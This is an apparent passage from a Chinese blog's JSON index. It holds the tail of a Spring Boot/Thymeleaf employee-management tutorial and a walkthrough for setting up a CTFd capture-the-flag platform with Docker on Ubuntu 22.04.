1234567891011121314151617181920212223242526272829&lt;form th:action=&quot;@&#123;/emp&#125;&quot; method=&quot;post&quot; &gt; &lt;input type=&quot;hidden&quot; name=&quot;id&quot; th:value=&quot;$&#123;emp.getId()&#125;&quot;&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;LastName&lt;/label&gt; &lt;input th:value=&quot;$&#123;emp.getLastName()&#125;&quot; class=&quot;form-control&quot; placeholder=&quot;kuangshen&quot; type=&quot;text&quot; name=&quot;lastName&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;Email&lt;/label&gt; &lt;input th:value=&quot;$&#123;emp.getEmail()&#125;&quot; class=&quot;form-control&quot; placeholder=&quot;24736743@qq.com&quot; type=&quot;email&quot; name=&quot;email&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt;&lt;label&gt;Gender&lt;/label&gt;&lt;br/&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input th:checked=&quot;$&#123;emp.getGender()==1&#125;&quot; class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;1&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;男&lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;form-check form-check-inline&quot;&gt; &lt;input th:checked=&quot;$&#123;emp.getGender()==0&#125;&quot; class=&quot;form-check-input&quot; name=&quot;gender&quot; type=&quot;radio&quot; value=&quot;0&quot;&gt; &lt;label class=&quot;form-check-label&quot;&gt;女&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt;&lt;label&gt;department&lt;/label&gt; &lt;select class=&quot;form-control&quot; name=&quot;department.id&quot;&gt; &lt;option th:selected=&quot;$&#123;dept.id==emp.getDepartment().getId()&#125;&quot; th:each=&quot;dept:$&#123;departments&#125;&quot; th:text=&quot;$&#123;dept.getDepartmentName()&#125;&quot; th:value=&quot;$&#123;dept.getId()&#125;&quot;&gt;&lt;/option&gt; &lt;/select&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot; &gt; &lt;label &gt;Birth&lt;/label&gt; &lt;input th:value=&quot;$&#123;#dates.format(emp.birth,&#x27;yyyy-MM-dd HH:mm&#x27;)&#125;&quot; class=&quot;form-control&quot; placeholder=&quot;2021-02-02&quot; type=&quot;text&quot; name=&quot;birth&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot; type=&quot;submit&quot;&gt;修改&lt;/button&gt;&lt;/form&gt; 修改成功 0x07 删除员工以及404页面实现编写跳转 1&lt;a class=&quot;btn btn-sm btn-danger&quot; th:href=&quot;@&#123;/delemp/&#125;+$&#123;emp.getId()&#125;&quot;&gt;删除&lt;/a&gt; 编写控制器 123456//员工删除 @GetMapping(&quot;/delemp/&#123;id&#125;&quot;) public String deleteEmp(@PathVariable(&quot;id&quot;) Integer id)&#123; employeeDao.delete(id); return &quot;redirect:/emps&quot;; &#125; 测试，成功删除员工。 新建 error 文件夹，把 404.html 移进去即可，访问不存在的路由，返回我们的 4040 页面","tags":["java 开发"],"categories":["开发"]},{"path":"/2024/07/04/ctf/基于 ctfd 搭建比赛平台/","content":"腾讯云 Ubuntu 22.04 环境配置换源 备份镜像源设置文件 1sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 编辑镜像源设置文件 1vim /etc/apt/sources.list 替换掉原文件中的所有内容并替换 12345678910111213# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse# 预发布软件源，不建议启用# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse 然后 12sudo apt updatesudo apt upgrade 更换 pip 源 123cd ~ # 进入家目录 cd .pip # 进入.pip文件夹vim pip.conf # 用vim编辑pip.conf文件 编辑内容为 1234567891011[global] index-url=https://pypi.tuna.tsinghua.edu.cn/simple timeout = 6000 [install] trusted-host=pypi.tuna.tsinghua.edu.cn disable-pip-version-check = true docker ， Docker Compose安装1234567apt-get install git docker docker-compose -y或者#apt-get install git docker.io docker-compose -y#启动 docker，并设置为开机自启sudo systemctl start dockersudo systemctl enable docker 123验证安装是否成功docker --versiondocker-compose --version 启用Docker Swarm，并为生成的Manager节点取一个别名 12docker swarm init --advertise-addr 127.0.0.1docker node update --label-add=&#x27;name=linux-1&#x27; $(docker node ls -q) ctfd 安装123456789git clone https://github.com/huangzheng2016/CTFd-docker CTFd这一步跳过修改vi CTFd/docker-compose.yml改这三行 - CTFD_URL=你的ip/domain - DIRECT_URL=你的ip/domain - DYNAMIC_URL=你的ip/domain 不改回默认跳转到test.com，如果是这样只能重新搭建了 #docker 换源 1sudo vim /etc/docker/daemon.json 替换为 123&#123; &quot;registry-mirrors&quot;:[&quot;https://docker.1panel.live&quot;]&#125; 或者去阿里加速https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors 123#重启systemctl daemon-reloadsystemctl restart docker 启动容器 123docker-compose builddocker-compose up -ddocker-compose -f docker-compose.yml exec ctfd python manage.py set_config whale auto_connect_network 部署赛题现成的题库12345sudo mkdir -p /opt/CTF #创建CTF目录cd /opt/CTFgit clone https://githubfast.com/CTFTraining/suctf_2019_easysql #在 CTFTraining 拉取一道真题 cd suctf_2019_easysqlls 然后我们直接在这个目录下： 1sudo docker-compose up -d #使用docker-compose下载镜像生成容器并启动容器 构建后你可以看一下是否构建完成： 1docker ps -a #查看容器状态 存在一个docker镜像了 管理员点击进入Admin Panel 管理界面：点击whale:点击 Frp 填入服务器 ip submit 保存一手，进入challenges界面：点击上面的加号：，这里部署 web 所以选择动态 flag，选择dynamic(如果你要是只要静态的flag,那你就用standard标准就行了) 这边docker image 就是你本地构建镜像的名字，如果不存在本地镜像会自动调用dockerhub上面的在线镜像内容 然后FRP port 的内容你就填80 这个是配置的默认转发接口，没绑域名的话 Type 选择 direct。 然后就是分数衰减最大分最小分 ctfd 美化在 CTFd&#x2F;CTFd&#x2F;themes 下拉取主题即可 1git clone https://githubfast.com/chainflag/ctfd-neon-theme.git 然后在 theme 页面设置。","tags":["ctf"],"categories":["CTF"]}]